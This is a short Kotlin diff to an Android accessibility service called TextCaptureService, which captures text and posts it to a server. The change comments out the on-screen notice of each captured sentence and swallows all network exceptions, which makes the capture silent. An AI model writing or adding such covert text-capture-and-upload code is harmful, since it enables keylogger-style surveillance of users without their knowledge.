@@ -15,7 +15,6 @@ import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
-import java.net.ConnectException
 import java.util.*
 
 class TextCaptureService : AccessibilityService() {
@@ -138,7 +137,7 @@ class TextCaptureService : AccessibilityService() {
     private fun captureText() {
         // only capture sentences with words 3 or more
         if (prevTxt.split(" ").size > 2) {
-            Toast.makeText(applicationContext, prevTxt, Toast.LENGTH_SHORT).show()
+//            Toast.makeText(applicationContext, prevTxt, Toast.LENGTH_SHORT).show()
             scope.launch {
                 postTxt(prevTxt)
             }
@@ -190,7 +189,7 @@ class TextCaptureService : AccessibilityService() {
                     }
                 }
 
-            } catch (_: ConnectException) {
+            } catch (_: Exception) {
             }
 
             prevTxt = ""
